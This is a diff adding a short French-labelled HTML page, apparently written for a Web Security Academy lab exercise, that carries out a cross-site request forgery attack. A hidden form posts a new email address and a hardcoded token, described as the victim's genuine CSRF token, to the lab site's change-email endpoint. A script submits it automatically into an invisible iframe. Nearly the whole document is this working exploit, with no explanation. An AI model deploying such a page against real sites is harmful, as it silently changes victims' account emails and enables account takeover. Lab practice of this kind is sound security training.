@@ -1,0 +1,19 @@
+<html>
+<head>
+    <title>Page d'attaque CSRF</title>
+</head>
+<body>
+    <iframe style="display:none;" name="csrf-iframe"></iframe>
+    
+    <form action="https://target-ac941f081e38b8ca80927e4f00d5002f.web-security-academy.net/my/account/change-email" method="post" id="csrf-form" target="csrf-iframe">
+        <input type="hidden" name="email" value="test@test.ca">
+
+         <!-- "Le jeton CSRF authentique de la victime"-->
+        <input type="hidden" name="csrf" value="vZxqP4QMI8XXl6q10q4D5MgFawPZzKa4bw">
+    </form>
+
+    <script>
+        document.getElementById("csrf-form").submit();
+    </script>
+</body>
+</html>
